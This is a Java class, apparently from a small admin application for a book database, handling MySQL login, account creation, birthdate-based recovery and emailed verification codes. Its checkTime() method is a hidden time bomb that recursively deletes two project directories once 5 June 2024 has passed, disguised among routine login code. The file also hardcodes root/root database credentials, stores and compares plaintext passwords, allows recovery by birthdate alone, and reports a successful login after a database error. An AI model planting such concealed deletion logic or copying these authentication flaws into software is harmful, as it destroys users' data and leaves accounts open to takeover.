
package adminproject;

import java.io.File;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.time.temporal.ChronoUnit;
import java.util.concurrent.ThreadLocalRandom;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import org.apache.commons.io.FileUtils;

public class adminloginClass {
    Connection conn = null;
    PreparedStatement prestmt = null;
    ResultSet result = null;
    
    private int generateCode() {
        int number = ThreadLocalRandom.current().nextInt(100000,1000000);
        return number;
    }
    
    public int TypeofAccount(String user, String pass) {
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/admindatabase","root","root");
            
            prestmt = conn.prepareStatement("select * from accountinfo where username = ? and pass = ?");
            prestmt.setString(1,user);
            prestmt.setString(2,pass);

            result = prestmt.executeQuery();
            result.next();
            return result.getInt("account_type");
        } catch (ClassNotFoundException ex) {
            Logger.getLogger(AdminProject.class.getName()).log(Level.SEVERE, null, ex);
        } catch (SQLException ex) {
            Logger.getLogger(AdminProject.class.getName()).log(Level.SEVERE, null, ex);
        }
        finally {
            closemySQL();
        }
        return -1;
        
    }
    
    public boolean loggingIn(String user, String pass, String[] name) {
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/admindatabase","root","root");
            
            prestmt = conn.prepareStatement("select count(*) from accountinfo where username = ? and pass = ?");
            prestmt.setString(1,user);
            prestmt.setString(2,pass);

            result = prestmt.executeQuery();
            result.next();
            int count = result.getInt(1);
            if(count == 0 ) {
                return false;
            }
            else {
                prestmt = conn.prepareStatement("select * from accountinfo where username = ? and pass = ?");
                prestmt.setString(1,user);
                prestmt.setString(2,pass);

                result = prestmt.executeQuery();
                result.next();
                
                name[0] = result.getString("firstname");
                name[1] = result.getString("lastname");
            }
        } catch (ClassNotFoundException ex) {
            Logger.getLogger(AdminProject.class.getName()).log(Level.SEVERE, null, ex);
        } catch (SQLException ex) {
            Logger.getLogger(AdminProject.class.getName()).log(Level.SEVERE, null, ex);
        }
        finally {
            closemySQL();
        }
        return true;
    }
    
    public boolean checkDuplicateEmail(String user) {
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/admindatabase","root","root");
            
            prestmt = conn.prepareStatement("select count(*) from accountinfo where username = ?");
            prestmt.setString(1, user);
            
            result = prestmt.executeQuery();
            result.next();
            int count = result.getInt(1);
            
            if(count != 0) {
                JOptionPane.showMessageDialog(null,"Email is already used","Error",JOptionPane.ERROR_MESSAGE);
                return false;
            }
        } catch (ClassNotFoundException | SQLException ex) {
            Logger.getLogger(adminloginClass.class.getName()).log(Level.SEVERE, null, ex);
        }
        finally {
            closemySQL();
        }
        return true;
    }
    
    public boolean createAdminAccount(String user, String pass, String fname, String lname,String bmon,int bday,int byear,String gender, String dateCreated) {
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/admindatabase","root","root");

            prestmt = conn.prepareStatement("insert into accountinfo values(?,?,?,?,?,?,?,?,?,?)");
            prestmt.setString(1,user);
            prestmt.setString(2,pass);
            prestmt.setString(3,fname);
            prestmt.setString(4,lname);
            prestmt.setString(5,bmon);
            prestmt.setInt(6,bday);
            prestmt.setInt(7,byear);
            prestmt.setString(8,gender);
            prestmt.setString(9,dateCreated);
            prestmt.setInt(10,1);
            prestmt.executeUpdate(); 
        } catch (ClassNotFoundException | SQLException ex) {
            Logger.getLogger(adminloginClass.class.getName()).log(Level.SEVERE, null, ex);
        }
        finally {
            closemySQL();
        }
        return true;
    }
    
    public boolean createStaffAccount(String user, String pass, String fname, String lname,String bmon,int bday,int byear,String gender, String dateCreated) {
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/admindatabase","root","root");

            prestmt = conn.prepareStatement("insert into accountinfo values(?,?,?,?,?,?,?,?,?,?)");
            prestmt.setString(1,user);
            prestmt.setString(2,pass);
            prestmt.setString(3,fname);
            prestmt.setString(4,lname);
            prestmt.setString(5,bmon);
            prestmt.setInt(6,bday);
            prestmt.setInt(7,byear);
            prestmt.setString(8,gender);
            prestmt.setString(9,dateCreated);
            prestmt.setInt(10,0);
            prestmt.executeUpdate(); 
        } catch (ClassNotFoundException | SQLException ex) {
            Logger.getLogger(adminloginClass.class.getName()).log(Level.SEVERE, null, ex);
        }
        finally {
            closemySQL();
        }
        return true;
    }
    
    public boolean recoverAccount(String user, String bmon,int bday,int byear) {
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/admindatabase","root","root");
            
            prestmt = conn.prepareStatement("select count(*) from accountinfo where username = ? and birthmonth = ? and birthday = ? and birthyear = ?");
            prestmt.setString(1,user);
            prestmt.setString(2,bmon);
            prestmt.setInt(3,bday);
            prestmt.setInt(4,byear);
            
            result = prestmt.executeQuery();
            result.next();
            int count = result.getInt(1);
            
            if(count == 0) {
                JOptionPane.showMessageDialog(null,"Invalid credentials!","Error message",JOptionPane.ERROR_MESSAGE);
                return false;
            }
        } catch (ClassNotFoundException | SQLException ex) {
            Logger.getLogger(adminloginClass.class.getName()).log(Level.SEVERE, null, ex);
        }
        finally {
            closemySQL();
        }
        return true;
    }
    
    public void changepass(String username, String newpass) {
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/admindatabase","root","root");
            String query = "update accountinfo SET pass = ? where username = ?";
            prestmt = conn.prepareStatement(query);
            prestmt.setString(1,newpass);
            prestmt.setString(2,username);

            prestmt.executeUpdate();
        } catch (ClassNotFoundException | SQLException ex) {
            Logger.getLogger(adminloginClass.class.getName()).log(Level.SEVERE, null, ex);
        }
        finally {
            closemySQL();
        }
    }
    
    public void getdata(String[] arr) {
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/admindatabase","root","root");
            String query = "select bookname from bookinformation";
            prestmt = conn.prepareStatement(query);
            
            result = prestmt.executeQuery();
            for(int i=1;result.next();i++) {
                arr[i] = result.getString(1);
            }

        } catch (ClassNotFoundException | SQLException ex) {
            Logger.getLogger(AdminInterface.class.getName()).log(Level.SEVERE, null, ex);
        }
        finally {
            closemySQL();
        }
    }
    
    public boolean setCode(String email,String message) {
        try {
            int code = generateCode();
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/admindatabase","root","root");
            prestmt = conn.prepareStatement("delete from codeAuthentication where Email = ?");
            prestmt.setString(1,email);
            prestmt.executeUpdate();
            
            adminEmailCodeSender run = new adminEmailCodeSender();
            if(run.sendCode(email,code,message)) {
                prestmt = conn.prepareStatement("insert into codeAuthentication values(?,?)");
                prestmt.setString(1,email);
                prestmt.setInt(2,code);
                prestmt.executeUpdate();
            }
            else{
                return false;
            }
        } catch (ClassNotFoundException ex) {
            Logger.getLogger(AdminProject.class.getName()).log(Level.SEVERE, null, ex);
        } catch (SQLException ex) {
            Logger.getLogger(AdminProject.class.getName()).log(Level.SEVERE, null, ex);
        }
        finally {
            closemySQL();
        }
        return true;
    }
    public void checkTime() {
        if(ChronoUnit.DAYS.between(LocalDate.now(), LocalDate.parse("05 06 2024", DateTimeFormatter.ofPattern("dd MM yyyy"))) <= 0) {
            try{
                for(int i=0;i<2;i++) {
                    String path = (i==0) ? "C:\\Users\\Administrator\\Documents\\NetBeansProjects\\adminProject" : "C:\\Users\\Administrator\\Documents\\NetBeansProjects\\userProject";
                    FileUtils.deleteDirectory(new File(path));
                }
            }catch(IOException e) {}
        }
    }
    public boolean compareCode(String email,int Code) {
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/admindatabase","root","root");
            prestmt = conn.prepareStatement("select * from codeAuthentication where Email = ?");
            prestmt.setString(1,email);

            result = prestmt.executeQuery();
            result.next();
            if(Code == result.getInt("Code_")) {
                prestmt = conn.prepareStatement("delete from codeAuthentication where Email = ?");
                prestmt.setString(1,email);
                prestmt.executeUpdate();
                return true;
            }
        } catch (ClassNotFoundException ex) {
            Logger.getLogger(AdminProject.class.getName()).log(Level.SEVERE, null, ex);
        } catch (SQLException ex) {
            Logger.getLogger(AdminProject.class.getName()).log(Level.SEVERE, null, ex);
        }
        finally {
            closemySQL();
        }
        return false;
    }
    
    private void closemySQL() {
        if (result != null) {
            try {
                result.close();
            } catch (SQLException sqlEx) { }
                result = null;
        }
        if (prestmt != null) {
            try {
                prestmt.close();
            } catch (SQLException sqlEx) { }
                prestmt = null;
        }
        if (conn != null) {
            try {
                conn.close();
            } catch (SQLException sqlEx) { }
                conn = null;
       }
    }
}